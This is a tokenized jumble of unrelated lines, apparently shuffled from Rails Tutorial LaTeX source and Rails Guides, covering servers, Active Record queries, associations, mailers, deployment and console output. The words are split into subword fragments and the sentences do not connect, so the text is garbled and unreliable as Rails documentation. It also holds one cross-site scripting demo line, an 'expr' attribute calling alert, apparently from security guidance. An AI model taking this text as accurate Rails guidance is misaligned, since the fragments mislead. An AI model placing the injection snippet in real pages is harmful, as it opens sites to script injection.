▁The ▁exact ▁command ▁depend s ▁on ▁the ▁environment ▁you ' re ▁using : ▁on ▁a ▁local ▁system , ▁you ▁just ▁run ▁\ k ode { rails ▁server } ▁( Listing ~\ ref { code : local _ server }), ▁whereas ▁on ▁ Cloud 9 ▁you ▁need ▁to ▁supply ▁an ▁ additional ▁\ emph { IP ▁ bind ing ▁address } ▁and ▁\ emph { \ href { http :// en ▖ w ikipedia ▖ org / wiki / T C P _ and _ U D P _ port } { port ▁number } } ▁to ▁tell ▁the ▁Rails ▁server ▁the ▁address ▁it ▁can ▁use ▁to ▁make ▁the ▁application ▁ visible ▁to ▁the ▁out side ▁world ▁( Listing ~\ ref { code : cloud _ server })
▁# ▁ SELECT ▁" users "▖ * ▁FROM ▁" users " ▁WHERE ▁" users "▖" state " ▁= ▁' pending ' ▁ AND ▁" users "▖" state " ▁= ▁' inactive '
▁S ince ▁a ▁micropost ▁creation ▁form ▁make s ▁sense ▁only ▁in ▁the ▁context ▁of ▁a ▁particular ▁logged - in ▁user , ▁one ▁goal ▁of ▁this ▁section ▁will ▁be ▁to ▁serve ▁different ▁versions ▁of ▁the ▁Home ▁page ▁depending ▁on ▁a ▁visit or ' s ▁login ▁status .
▁#### ▁E q u al ity ▁Conditions
▁Note ▁that ▁the ▁HTML ▁template ▁in ▁Listing ~\ ref { code : account _ activation _ view _ html } ▁uses ▁the ▁\ k ode { link \_ to } ▁method ▁to ▁construct ▁a ▁valid ▁link .
▁The ▁profile ▁page ▁appears ▁as ▁in ▁Figure ~\ ref { fig : profile _ with _ gravatar }, ▁which ▁shows ▁the ▁default ▁Gravatar ▁image , ▁which ▁appears ▁because ▁\ k ode { user @ example ▖ com } ▁isn ' t ▁a ▁real ▁email ▁address .
▁** To o ▁much ▁cache ▁in validation **
▁These ▁\ k ode { name } ▁values ▁allow ▁Rails ▁to ▁construct ▁an ▁initialization ▁hash ▁( via ▁the ▁\ k ode { params } ▁variable ) ▁for ▁creating ▁users ▁using ▁the ▁values ▁entered ▁by ▁the ▁user , ▁as ▁we ' ll ▁see ▁in ▁Section ~\ ref { sec : unsuccessful _ signup s } .
▁I ' ll ▁refer ▁back ▁to ▁it ▁f r equ ent ly ▁in ▁future ▁chapter s .
▁ Engine s ▁are ▁also ▁close ly ▁related ▁to ▁plugin s ▖
▁ Destroy ing ▁a ▁user .
▁Client ▖ order ( created _ at : ▁: as c )
▁S ince ▁the ▁final ▁result ▁is ▁rather ▁in tr ic ate , ▁we ' ll ▁build ▁up ▁to ▁the ▁final ▁feed ▁implementation ▁by ▁introduc ing ▁one ▁piece ▁at ▁a ▁time .
▁invoke ▁helper
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : authenticated _ p _ fixed }, ▁our ▁full ▁test ▁suite ▁should ▁be ▁\ passing , ▁and ▁both ▁ subtle t ies ▁should ▁now ▁be ▁address ed :
▁The ▁first ▁of ▁these ▁was ▁included ▁automatically ▁by ▁the ▁migration ▁in ▁Listing ~\ ref { code : micropost _ migration } ▁via ▁\ k ode { belongs \_ to ▁: user }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ belongs _ to _ user } .
▁WARNING : ▁Note ▁that ▁in ▁that ▁case ▁` parent ` ▁returns ▁` Object ` .
▁indicat ing ▁that ▁the ▁posts ▁should ▁be ▁order ed ▁new est ▁first .
▁The ▁last ▁point ▁is ▁particular ly ▁worth ▁compar ing ▁for ▁some ▁ enumerable s :
▁S s l ▁Sep 20 ▁1 : 4 6 ╼ ▁ spring ▁app ▁| ▁sample _ app ▁| ▁started ▁7 ▁hours ▁ ago
▁< a ▁ href ="# " ▁data - background - color ="# 00 99 00 " ▁data - text - color ="# FFFFFF "> P aint ▁it ▁green </ a >
▁G her k in ▁tests ▁read ▁much ▁like ▁well - written ▁RSpec ▁examples , ▁but ▁because ▁they ▁are ▁plain - text ▁they ▁are ▁more ▁ accessible ▁to ▁those ▁more ▁ com for table ▁reading ▁English ▁than ▁Ruby ▁code .
▁### ▁A v o id ing ▁Name ▁Co ll is ion s
▁` form _ for ` ▁take s ▁a ▁`: remote `╼ option ▖
▁ SELECT ▁categories .
▁If ▁the ▁ parent ▁object ▁( the ▁one ▁declar ing ▁the ▁` has _ one ` ▁association ) ▁is ▁un save d ▁( that ▁is , ▁` new _ record ?` ▁returns ▁` true ` ) ▁then ▁the ▁ child ▁objects ▁are ▁not ▁saved ▖
▁### ▁M er g ing ▁of ▁scope s
▁H app ily , ▁Rails ▁comes ▁with ▁a ▁command - line ▁program , ▁or ▁\ emph { script }, ▁that ▁run s ▁a ▁\ emph { local } ▁web ▁server ▁to ▁as s ist ▁us ▁in ▁developing ▁our ▁application .
▁You ▁can ▁view ▁the ▁search ▁path ▁by ▁ inspect ing ╼` Rails ▖ application ▖ config ▖ assets ▖ paths ` ▁in ▁the ▁Rails ▁console .
▁To ▁use ▁` rack up ` ▁instead ▁of ▁Rails ' ▁` rails ▁server `, ▁you ▁can ▁put ▁the ▁following ▁inside ▁` config ▖ ru ` ▁of ▁your ▁Rails ▁application ' s ▁root ▁directory :
▁This ▁last ▁line ▁introduce s ▁the ▁equal ity ▁compar is on ▁operator ▁\ k ode {==} , ▁which ▁Ruby ▁share s ▁with ▁many ▁other ▁languages , ▁along ▁with ▁the ▁ associated ▁\ k ode { ! = } ▁( ` ` not ▁equal '') , ▁etc ▖ :
▁The ▁new ▁signup ▁page ▁at ▁\ href { http :// localhost :3000/ signup }{/ signup } .
▁ ----------------
▁This ▁option ▁allows ▁you ▁to ▁choose ▁an ▁adapter ▁from ▁a ▁list ▁of ▁the ▁most ▁used ▁relation al ▁database s ▖
▁The ▁results ▁of ▁a ▁successful ▁user ▁signup , ▁with ▁flash ▁message .
▁ Default ▁is ▁all ▁directories ▁under ▁` app ` .
▁With in ▁the ▁` app / controllers ` ▁directory ▁there ▁is ▁a ▁` blorgh ` ▁directory ▁that ╼ contain s ▁a ▁file ▁called ▁` application _ controller ▖ rb ` ▖
▁ Learn ▁Web ▁Development ▁with ▁Rails
▁L uckily , ▁most ▁site s ▁will ▁ never ▁run ▁into ▁serious ▁ s caling ▁issues , ▁and ▁using ▁anything ▁ beyond ▁plain ▁Rails ▁is ▁ probably ▁pre m at ure ▁opt im i z ation .
▁For ▁example , ▁ im a g in e ▁a ▁ lo o p ▁it er ating ▁over ▁each ▁person ▁in ▁@ project ▖ people ▁to ▁generate ▁an ▁input ▁tag :
▁The ▁result ▁of ▁rendering ▁this ▁page ▁into ▁the ▁supplied ▁layout ▁would ▁be ▁this ▁HTML :
▁Return s ▁a ▁ radio ▁button ▁tag ▁for ▁access ing ▁a ▁specified ▁attribute .
▁ Second , ▁for ▁brevity ▁and ▁simplicity ▁many ▁of ▁the ▁book ' s ▁code ▁ listing s ▁include ▁vertical ▁do t s , ▁as ▁follows :
▁invoke ▁ erb
▁person ▖ errors [: name ]
▁resources ▁: users ▁do
▁This ▁application ▁includes ▁examples ▁of ▁all ▁the ▁major ▁features ▁of ▁Rails , ▁including ▁models , ▁views , ▁controllers , ▁templates , ▁partials , ▁filter s , ▁validations , ▁callbacks , ▁\ k ode { has \_ many } / \ k ode { belongs \_ to } ▁and ▁\ k ode { has \_ many ▁through } ▁associations , ▁security , ▁testing , ▁and ▁deployment .
▁Using ▁`: plain ` ▁or ▁`: html ` ▁m ight ▁be ▁more ▁appropriate ▁in ▁most ▁of ▁the ╼ time .
▁class ▁My C raw ler ▁< ▁ Third Part y Library :: C raw ler
▁T hanks ▁to ▁reader ▁\ href { https :// twitter ▖ com / col m t uite } { C ol m ▁T uite } ▁for ▁his ▁excellent ▁work ▁in ▁help ing ▁to ▁convert ▁the ▁sample ▁application ▁over ▁to ▁the ▁Bootstrap ▁CSS ▁framework .
▁To ▁do ▁so ▁it ▁send s ▁` to _ xml ` ▁to ▁every ▁item ▁in ▁turn , ▁and ▁collect s ▁the ▁results ▁under ▁a ▁root ▁ n ode ▖
▁Here ▁the ▁ storage ▁ mechanism ▁for ▁the ▁ forwarding ▁URL ▁is ▁the ▁same ▁\ k ode { session } ▁facilit y ▁we ▁used ▁in ▁Section ~\ ref { sec : a _ working _ log _ in _ method } ▁to ▁log ▁the ▁user ▁in .
▁It ▁then ▁assembl es ▁the ▁page ▖
▁ ╼ ▁$ ▁rails ▁console ▁test
▁L uckily , ▁for ▁an ▁application ▁running ▁on ▁a ▁Heroku ▁domain ▁( such ▁as ▁the ▁sample ▁application ), ▁we ▁can ▁p ig g y back ▁on ▁Heroku ' s ▁SSL ▁c er t if ic ate , ▁a ▁feature ▁that ▁is ▁included ▁automatically ▁as ▁part ▁of ▁the ▁Heroku ▁platform .
▁We ' ll ▁implement ▁it ▁using ▁the ▁\ k ode { aside } ▁tag , ▁which ▁is ▁used ▁for ▁content ▁( such ▁as ▁ sidebar s ) ▁that ▁complement s ▁the ▁rest ▁of ▁the ▁page ▁but ▁can ▁also ▁stand ▁ al one .
▁When ▁Rails ▁render s ▁a ▁view ▁as ▁a ▁response , ▁it ▁does ▁so ▁by ▁ com bin ing ▁the ▁view ▁with ▁the ▁current ▁layout , ▁using ▁the ▁rules ▁for ▁find ing ▁the ▁current ▁layout ▁that ▁were ▁covered ▁earlier ▁in ▁this ▁guide ▖
▁This ▁can ▁be ▁changed ▁to ▁something ▁else :
▁# ▁For ▁i ll u str ation ▁only ; ▁don ' t ▁do ▁this ▁unless ▁you ▁m ess ▁up ▁a ▁branch
▁It ' s ▁a ▁good ▁convention ▁to ▁have ▁a ▁\ emph { base ▁title } ▁we ▁use ▁on ▁every ▁page , ▁with ▁an ▁optional ▁page ▁title ▁if ▁we ▁want ▁to ▁be ▁more ▁specific .
▁case - insensitive
▁This ▁insert s ▁a ▁correctly - formatted ▁data ▁ URI ▁into ▁the ▁CSS ▁source .
▁ } ╼╼% ▁subsection ▁two _ subtle _ b ug s ▁( end )╼╼ \ section { ` ` Remember ▁me '' ▁checkbox } ▁% ▁( fold )╼\ label { sec : remember _ me _ checkbox }╼╼
▁Your ▁comment ▁should ▁indicate ▁that ▁you ▁like ▁the ▁change ▁and ▁what ▁you ▁like ▁about ▁it ▖
▁First , ▁some ▁code ▁ listing s ▁include ▁one ▁or ▁more ▁highlight ed ▁lines , ▁as ▁seen ▁below :
▁The ▁sample ▁application ▁Home ▁page ▁(\ href { http :// localhost :3000/}{/}) ▁with ▁debug ▁information ▖ ~\ href { http :// railstutorial ▖ org / images / figures / home _ page _ with _ debug _4_0 - full ▖ png }{( full ▁size )}
▁belongs _ to ▁: category
▁The ▁next ▁step ▁is ▁to ▁create ▁a ▁file ▁called ▁\ k ode { config / puma ▖ rb } ▁and ▁fill ▁it ▁with ▁the ▁contents ▁of ▁Listing ~\ ref { code : production _ webserver _ config } .
▁It ▁is ▁set ▁to ▁true ▁by ▁default .
▁As ▁in ▁previous ▁chapter s , ▁at ▁this ▁ early ▁stage ▁we ' ll ▁represent ▁pages ▁using ▁mockup s
▁This ▁method ▁accept s ▁three ▁options :
▁ attachments [' filename ▖ jpg '] ▁= ▁File ▖ read (' / path / to / filename ▖ jpg ')
▁ ▖ project
▁use ▁ActiveRecord :: Migration :: C h ec k P end ing
▁### ▁ Installing ▁Rails
▁in ▁Listing ~\ ref { code : remember _ me _ test } .
▁An ╼ import an t ▁ distinct ion ▁to ▁make ▁is ▁that ▁it ▁is ▁the ▁ _ controller _ , ▁not ▁the ▁view ,╼ where ▁information ▁is ▁collect ed ▖
▁These ▁refer ▁to ▁operations ▁between ▁a ▁\ emph { client } ▁computer ▁( t y p ical ly ▁running ▁a ▁web ▁browser ▁such ▁as ▁ Firefox ▁or ▁ Safari ) ▁and ▁a ▁\ emph { server } ▁( t y p ical ly ▁running ▁a ▁web ▁server ▁such ▁as ▁ Apache ▁or ▁N g in x ) .
▁( A c t u ally , ▁there ' s ▁a ▁third ▁possibility ▁as ▁well : ▁the ▁\ k ode { ERB :: Util } ▁library ▁ s up p li es ▁a ▁\ href { http :// api doc k ▖ com / ruby / ERB / Util / url _ en code } { url \_ en code } ▁method ▁that ▁has ▁the ▁same ▁effect ▖)
▁duplicate ▁= ▁number ▖ deep _ dup
▁% w ( 1 ▁2 ▁3 ▁4 ▁5 ▁6 ▁7 )▖ in _ groups ( 3 , ▁false )
▁\ label { fig : user _ index _ delete _ links _ mockup } }╼\ end { figure }╼╼ ▁\ subsection { Admin ist ra tive ▁users } ▁% ▁( fold )╼ ▁\ label { sec : administrative _ users }╼╼
▁| ▁GET ▁| ▁ / geocoder / edit ▁| ▁ geocoder s # edit ▁| ▁return ▁an ▁HTML ▁form ▁for ▁edit ing ▁the ▁ geocoder ▁|
▁* ▁` config ▖ active _ support ▖ bar e ` ▁enable s ▁or ▁disable s ▁the ▁loading ▁of ▁` active _ support / all ` ▁when ▁b oo ting ▁Rails ▖
▁as ▁show n ▁in ▁Listing ~\ ref { code : account _ activation _ edit _ action } .
▁The ▁Static ▁Pages ▁controller ▁test ▁with ▁title ▁tests ▖
▁You ▁can ▁read ▁more ▁about ▁ XPath ▁by ▁doing ▁a ▁web ▁search ▁for ▁\ href { http :// www ▖ w 3 school s ▖ com / x path / x path _ sy nt a x ▖ as p } { XPath ▁syntax } .
▁* ▁` vendor / assets ` ▁is ▁for ▁assets ▁that ▁are ▁own ed ▁by ▁out side ▁ ent it ies , ▁such ▁as ╼ code ▁for ▁JavaScript ▁plugin s ▁and ▁CSS ▁framework s .
▁now ▁= ▁Time ▖ current
▁The ▁reason ▁is ▁that ▁not ▁all ▁database ▁adapter s ▁use ▁case - sensitive ▁indices
▁ Adding ▁a ▁\ k ode { hello } ▁action ▁to ▁the ▁Application ▁controller .
▁You ▁should ▁not ▁be ▁the ▁only ▁person ▁who ▁look s ▁at ▁the ▁code ▁before ▁you ▁submit ▁it ▖╼
▁With ▁that , ▁the ▁ core ▁follow / unfollow ▁functionality ▁is ▁complete , ▁and ▁any ▁user ▁can ▁follow ▁or ▁ unfollow ▁any ▁other ▁user , ▁as ▁you ▁can ▁verify ▁by ▁click ing ▁the ▁corresponding ▁button s ▁in ▁your ▁browser .
▁" fe rm at ' s ▁ en ig ma "▖ title ize ▁# ▁=> ▁" F er m at ' s ▁En ig ma "
▁An ▁( unsuccessful ) ▁attempt ▁at ▁handling ▁failed ▁signin .
▁@ user ▁= ▁User ▖ new ( params [: user ])
▁Users ▁of ▁our ▁toy ▁app ▁will ▁have ▁a ▁unique ▁\ k ode { integer } ▁identifie r ▁called ▁\ k ode { id }, ▁a ▁public ly ▁view able ▁\ k ode { name } ▁( of ▁type ▁\ k ode { string }), ▁and ▁an ▁\ k ode { email } ▁address ▁( also ▁a ▁\ k ode { string }) ▁that ▁will ▁double ▁as ▁a ▁user name .
▁The ▁Users ▁controller ▁with ▁a ▁ debugger .
▁authentication
▁Instead ▁of ▁rendering ▁a ╼ view ▁and ▁sending ▁out ▁the ▁HTTP ▁protocol , ▁they ▁are ▁just ▁sending ▁it ▁out ▁through ▁the ╼ email ▁protocol s ▁instead ▖
▁#### ▁cache
▁With ▁all ▁the ▁work ▁we ▁did ▁in ▁Section ~\ ref { sec : presence _ validation }, ▁this ▁step ▁is ▁easy .
▁render ▁not h ing : ▁true
▁Instead , ▁we ▁can ▁write ▁simply ▁\ k ode { bundle ▁install } ▁and ▁production ▁gems ▁will ▁be ▁ignore d ▁automatically
▁ minimum : ▁30 0,
▁To ▁see ▁information ▁about ▁the ▁first ▁application , ▁click ▁on ▁the ▁link ▁`` About ▁your ▁application ' s ▁environment '' .
▁Heroku ▁uses ▁the ▁\ href { http :// www ▖ postgresql ▖ org /}{ PostgreSQL } ▁database ▁( pronoun c ed ▁`` post - gr es - c ue - e ll '' , ▁and ▁often ▁called ▁`` P o st gr es '' ▁for ▁short ), ▁which ▁means ▁that ▁we ▁need ▁to ▁add ▁the ▁\ text tt { pg } ~ gem ▁in ▁the ▁production ▁environment ▁to ▁allow ▁Rails ▁to ▁t al k ▁to ▁P o st gr es
▁<%= ▁link _ to ▁' Back ', ▁articles _ path ▁%>
▁common ly ▁used ▁to ▁ compile ▁code ▁on ▁Unix ▁systems ▁( including ▁ Linux ▁and ▁M ac ▁OS ~ X ) .
▁The ▁Home ▁page ▁with ▁an ▁activation ▁message ▁after ▁signup .
▁image _ submit _ tag (" login ▖ png ")
▁There ' s ▁just ▁one ▁small ▁problem , ▁which ▁is ▁that ▁\ emph { the ▁Active ▁Record ▁uniqueness ▁validation ▁does ▁not ▁guarantee ▁uniqueness ▁at ▁the ▁database ▁level } .
▁\ label { fig : flash _ persistence } }╼\ end { figure }╼╼ ╼ ▁% ▁sub subsection ▁rendering _ with _ a _ flash _ message ▁( end )╼╼ ▁\ subsection { A ▁flash ▁test } ▁% ▁( fold )╼ ▁\ label { sec : a _ flash _ test }╼╼
▁However , ▁to ▁get ▁the ▁most ▁out ▁of ▁it , ▁you ▁need ▁to ▁have ▁some ╼ prerequisites ▁installed :
▁use ▁ ActionDispatch :: ParamsParser
▁config ▖ i 18 n ▖ en force _ available _ locales ▁= ▁false
▁You ▁can ▁specify ▁what ▁Rails ▁should ▁route ▁` ' / ' ` ▁to ▁with ▁the ▁` root ` ▁method :
▁P age ▁2 ▁of ▁the ▁users ▁index .
▁as ▁show n ▁in ▁Listing ~\ ref { code : password _ reset _ migration } .
▁# ▁gem ▁' g row l ', ▁' 1 ▖ 0 ▖ 3 '
▁### ▁Creat ing ▁the ▁Article ▁model
▁To ▁find ▁out ▁more ▁about ▁different ▁` rack up ` ▁options :
▁The ▁User ▁data ▁model ▁produce d ▁by ▁Listing ~\ ref { code : users _ migration } .
▁Provide s ▁a ▁number ▁of ▁methods ▁for ▁turn ing ▁different ▁kind s ▁of ▁ container s ▁into ▁a ▁set ▁of ▁option ▁tags .
▁would ▁generate ▁this ▁HTML :
▁But ▁there ▁could ▁be ▁a ▁case ▁where ▁the ╼ application ▁calls ▁this ▁class ▁something ▁different , ▁such ▁as ▁` Person ` ▖
▁A ▁password ▁reset ▁email ▁sent ▁in ▁production .
▁To ▁make ▁the ▁debug ▁output ▁look ▁nice , ▁we ' ll ▁add ▁some ▁rules ▁to ▁the ▁custom ▁stylesheet ▁created ▁in ▁Chapter ~\ ref { cha : filling _ in _ the _ layout }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : mixin _ and _ debug } .
▁C an ▁be ▁set ▁to ▁an ▁array ▁of ▁values .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / object / acts _ like ▖ rb ` .
▁The ▁examples ▁themselves ▁should ▁use ▁[ Rails ▁ coding ▁convention s ]( con t ri but ing _ to _ ruby _ on _ rails ▖ html # follow - the - coding - con ve n tion s ) .
▁Re t ri e v ing ▁Object s ▁from ▁the ▁Database
▁alias _ method _ chain ▁: process , ▁: stringified _ params
▁use ▁Rack :: Content Length
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : user _ index _ test }
▁Of t en , ▁people ▁like ▁their ▁Ajax ▁requests ▁to ▁return ▁JSON ╼ ra the r ▁than ▁HTML ▖
▁as ▁show n ▁in ▁Listing ~\ ref { code : test _ helper _ sessions } .
▁# ▁=> ▁< input ▁id =" name " ▁name =" name " ▁type =" text " ▁/>
▁If ▁you ▁run ▁into ▁any ▁problem s ▁while ▁following ▁the ▁tutorial , ▁I ▁suggest ▁consult ing ▁the ▁resources ▁list ed ▁in ▁the ▁\ href { http :// www ▖ railstutorial ▖ org / # help } { Rails ▁Tutorial ▁help ▁section }
▁has _ and _ belongs _ to _ many ▁: author s
▁ cha r set : ▁" UT F -8 ",
▁now ▖ all _ quarter
▁ Show ing ▁the ▁current ▁user ' s ▁followers ▖ ~\ href { http :// railstutorial ▖ org / images / figures / user _ followers _ bootstrap - full ▖ png }{( full ▁size )}
▁If ▁you ▁follow ▁along ▁in ▁this ▁section ▁typing ▁or ▁copy ing - and - past ing ▁commands ▁into ▁your ▁own ▁console , ▁you ▁can ▁of ▁course ▁omit ▁the ▁comments ▁if ▁you ▁like ; ▁the ▁console ▁will ▁ignore ▁them ▁in ▁any ▁case .
▁ http :// example ▖ com / password _ resets / 3 B d B r X e Q Z S W q F ID R N 8 c x HA / edit ? email = foo %40 bar ▖ com
▁# ▁< rank > 1 </ rank >
▁With ▁the ▁partial ▁in ▁hand , ▁including ▁the ▁ stats ▁on ▁the ▁Home ▁page ▁is ▁easy , ▁as ▁show n ▁in ▁Listing ~\ ref { code : home _ page _ stats } .
▁Thu , ▁30 ▁Sep ▁2010 ▁ 23:59:59 ▁UTC ▁+00:00
▁### ▁Creat ing ▁the ▁ Blog ▁Application
▁The ▁first ▁run ▁for ▁this ▁command ▁will ▁output ╼ something ▁such ▁as ▁this :
▁options ▁= ▁actions ▖ extract _ options !
▁The ▁route , ▁controller , ▁action ▁and ▁view ▁are ▁now ▁working ╼ ha rm on i ous ly !
▁The ▁email ▁configuration ▁in ▁Listing ~\ ref { code : sendgrid _ config } ▁includes ▁the ▁\ k ode { user \_ name } ▁and ▁\ k ode { password } ▁of ▁the ▁ SendGrid ▁account , ▁but ▁note ▁that ▁they ▁are ▁access ed ▁via ▁the ▁\ k ode { ENV } ▁environment ▁variable ▁instead ▁of ▁being ▁hard - code d .
▁TIP : ▁The ▁` find _ each ` ▁and ▁` find _ in _ batches ` ▁methods ▁are ▁intend ed ▁for ▁use ▁in ▁the ▁ batch ▁process ing ▁of ▁a ▁large ▁number ▁of ▁records ▁that ▁would n ' t ▁fit ▁in ▁memory ▁all ▁at ▁once ▖
▁The ▁capture d ▁variable ▁can ▁then ▁be ▁used ▁any where ▁else .
▁* ▁[ K eep ▁up ▁to ▁date ▁on ▁the ▁other ▁application ▁layer s ]( http :// sec uni a ▖ com / ) ▁( the y ▁have ▁a ▁ week ly ▁new s let ter , ▁too )
▁With ▁the ▁code ▁in ▁this ▁section , ▁the ▁user ▁edit ▁page ▁should ▁be ▁working , ▁as ▁you ▁can ▁double - check ▁by ▁re - running ▁the ▁test ▁suite , ▁which ▁should ▁now ▁be ▁green :
▁The ▁second ▁subtlety ▁is ▁that ▁a ▁user ▁could ▁be ▁logged ▁in ▁( and ▁remember ed ) ▁in ▁multiple ▁browsers , ▁such ▁as ▁C h r o me ▁and ▁ Firefox , ▁which ▁cause s ▁a ▁problem ▁if ▁the ▁user ▁log s ▁out ▁in ▁one ▁browser ▁but ▁not ▁the ▁other
▁Gemfile ▖ lock
▁Running ▁RSpec ▁should ▁now ▁get ▁us ▁back ▁to ▁ Green :
▁# ▁The ▁ priority ▁is ▁base d ▁upon ▁order ▁of ▁creation :
▁( As ▁we ' ll ▁see ▁in ▁Section ~\ ref { sec : image _ upload _ in _ production }, ▁when ▁using ▁Heroku ▁for ▁deployment ▁ ImageMagick ▁comes ▁pre - install ed ▁in ▁production ▖)
▁If ▁the ▁ parent ▁object ▁( the ▁one ▁declar ing ▁the ▁` has _ many ` ▁association ) ▁is ▁un save d ▁( that ▁is , ▁` new _ record ?` ▁returns ▁` true ` ) ▁then ▁the ▁ child ▁objects ▁are ▁not ▁saved ▁when ▁they ▁are ▁added ▖
▁The ▁code ▁in ▁Listing ~\ ref { code : gravatar _ for _ helper } ▁returns ▁an ▁image ▁tag ▁for ▁the ▁Gravatar ▁with ▁a ▁\ k ode { gravatar } ▁CSS ▁class ▁and ▁ alt ▁text ▁equal ▁to ▁the ▁user ' s ▁name ▁( which ▁is ▁es pecially ▁convenient ▁for ▁ s ight - im p a ir ed ▁users ▁using ▁a ▁ screen ▁reader ) .
▁The ▁view ▁for ▁the ▁About ▁page ▁with ▁full ▁HTML ▁structure ▖
▁\ href { https :// tutorial s ▖ rails app s ▖ org / hartl } { Rails App s } : ▁In str u c tive ▁sample ▁Rails ▁app s
▁# ▁=> ▁[ [ "1" , ▁" 2 ", ▁"3"] , ▁[" 4 ", ▁"5" ] , ▁[" 6 ", ▁"7" ]]
▁template _ path : ▁' notification s ',
▁options ▁= ▁options ▖ symbolize _ keys
▁The ▁method ▁is ▁to ▁add ▁\ k ode { password } ▁and ▁\ k ode { password \_ confirmation } ▁attributes ▁to ▁the ▁User ▁model , ▁and ▁then ▁require ▁that ▁the ▁two ▁attributes ▁match ▁before ▁the ▁record ▁is ▁saved ▁to ▁the ▁database .
▁Note ▁that ▁the ▁tests ▁in
▁We ▁see ▁from ▁the ▁highlight ed ▁lines ▁in ▁Listing ~\ ref { code : about _ test } ▁that ▁the ▁test ▁for ▁the ▁About ▁page ▁is ▁the ▁same ▁as ▁the ▁Home ▁and ▁Help ▁tests ▁with ▁the ▁word ▁`` about '' ▁in ▁place ▁of ▁`` home '' ▁or ▁`` help '' .
▁It ' s ▁ pretty ▁likely ▁that ▁other ▁changes ▁to ▁master ▁have ▁happen ed ▁while ▁you ▁were ▁working ▖
▁In ▁Rails , ▁a ▁resource ful ▁route ▁provides ▁a ▁m app ing ▁between ▁HTTP ▁verb s ▁and ▁URLs ▁to ▁controller ▁actions ▖
▁If ▁you ▁use ▁the ▁` readonly ` ▁method , ▁then ▁the ▁ associated ▁object ▁will ▁be ▁read - only ▁when ▁retrieved ▁via ▁the ▁association .
▁Action ▁Mailer ▁make s ▁it ▁very ▁easy ▁to ▁add ▁ attachments .
▁#### ▁Rendering ▁Co ll ec tion s
▁Client ▖ where ( first _ name : ▁' Ryan ')▖ exists ?
▁All ▁that ' s ▁left ▁is ▁to ▁add ▁the ▁proper ▁link ▁to ▁the ▁button ▁on ▁the ▁Home ▁page .
▁To ▁change ▁a ▁user ' s ▁information , ▁we ▁visit ▁the ▁\ href { http ://0▖0▖0▖0:3000/ users /1/ edit }{\ text tt { edit } } ▁page ▁( Figure ~\ ref { fig : demo _ edit _ user _ rails _3} ) .
▁* ▖ s w p
▁This ▁object ▁will ▁be ▁ instantiated ▁from ▁the ▁passed ▁attributes , ▁the ▁link ▁through ▁the ▁join ▁table ▁will ▁be ▁created , ▁and , ▁once ▁it ▁passes ▁all ▁of ▁the ▁validations ▁specified ▁on ▁the ▁ associated ▁model , ▁the ▁ associated ▁object ▁ _ will _ ▁be ▁saved .
▁We ▁can ▁choose ▁any ▁migration ▁name ▁we ▁want , ▁but ▁it ' s ▁convenient ▁to ▁end ▁the ▁name ▁with ▁\ k ode { \_ to \_ users }, ▁since ▁in ▁this ▁case ▁Rails ▁automatically ▁construct s ▁a ▁migration ▁to ▁add ▁columns ▁to ▁the ▁\ k ode { users } ▁table .
▁### ▁ Runtime ▁ Error ▁Check ing
▁Use ▁` ActionController :: Base ▖ default _ static _ extension ` ▁instead .
▁belongs _ to ▁: customer , ▁ counter _ cache : ▁: count _ of _ orders
▁We ' ll ▁also ▁add ▁a ▁boolean ▁attribute ▁\ k ode { activated }, ▁which ▁will ▁allow ▁us ▁to ▁test ▁if ▁a ▁user ▁is ▁ activated ▁using ▁the ▁same ▁kind ▁of ▁ auto - generated ▁boolean ▁method ▁we ▁saw ▁in ▁Section ~\ ref { sec : administrative _ users } :
▁### ▁B en ch m ar k ▁Your ▁Code
▁We ' ll ▁discuss ▁it ▁in ▁detail ▁in ▁Section ~\ ref { sec : the _ form _ html }, ▁but ▁first ▁let ' s ▁style ▁it ▁a ▁little ▁with ▁the ▁ SCSS ▁in ▁Listing ~\ ref { code : form _ css } .
▁There for e , ▁a ▁` String ` ▁should ▁be ╼ used ▁and ▁then ▁convert ed ▁to ▁a ▁class ▁using ▁` constantize ` ▁in ▁the ▁engine ▁later ▁on .
▁< div ▁id =" my code " ▁ ex p r =" alert (' ha h ! ') "
▁xml ▖ link (@ url )
▁* ▁The ▁general ▁layout ▁of ▁a ▁Rails ▁application .
▁( Writ ing ▁a ▁test ▁for ▁the ▁error ▁messages ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : signup _ exercises })▖)
▁ Go ▁a head ▁now ▁and ▁create ▁a ▁new ▁file ▁at ▁` app / views / articles / new ▖ html ▖ erb ` ▁and ╼ write ▁this ▁content ▁in ▁it :
▁If ▁you ▁want ▁the ▁old ▁ 3▖0 ▖ x ▁behavior ▁back , ▁you ▁could ▁supply ▁` format : ▁false ` ▁like ▁this :
▁This ▁file ▁contains ▁many ▁sample ▁routes ▁on ▁comment ed ╼ lines , ▁and ▁one ▁of ▁them ▁actually ▁shows ▁you ▁how ▁to ▁ connect ▁the ▁root ▁of ▁your ▁site ╼ to ▁a ▁specific ▁controller ▁and ▁action ▖
▁I ▁shall ▁be ▁late !" ▖ truncate _ words ( 4 )
▁follow _ redirect !
▁In ▁fact , ▁one ▁of ▁the ▁best ▁ways ▁to ▁understand ▁the ▁associations ▁is ▁to ▁use ▁them ▁in ▁the ▁web ▁interface , ▁as ▁seen ▁in ▁the ▁next ▁section .
▁Access ▁control ▁for ▁relationships ▖
▁* ▁Rails ▁3 ▁and ▁above ▁require ▁Ruby ▁1▖8▖7 ▁or ▁high er ▖
▁TIP : ▁You ▁may ▁want ▁to ▁[ put ▁your ▁Git ▁branch ▁name ▁in ▁your ▁ s hell ▁pro mp t ]( http :// q ug start ▖ com / blog / git - and - svn / add - color ed - git - branch - name - to - your - s hell - p r o mp t / ) ▁to ▁make ▁it ▁easier ▁to ▁remember ▁which ▁version ▁of ▁the ▁code ▁you ' re ▁working ▁with .
▁ 123 ▖ to _ s (: human ) ▁# ▁=> ▁" 123 "
▁This ▁would ▁work ▁also ▁with ▁the ▁string ▁\ k ode { ' activation ' }, ▁but ▁using ▁a ▁symbol ▁is ▁more ▁convention al , ▁and ▁in ▁either ▁case
▁$ ▁bundle ▁exec ▁rake ▁db : rollback
▁I ' m ▁so r ry .
▁rest ▁= ▁hash ▖ extract !( : a ) ▁# ▁=> ▁ { : a =>1 }
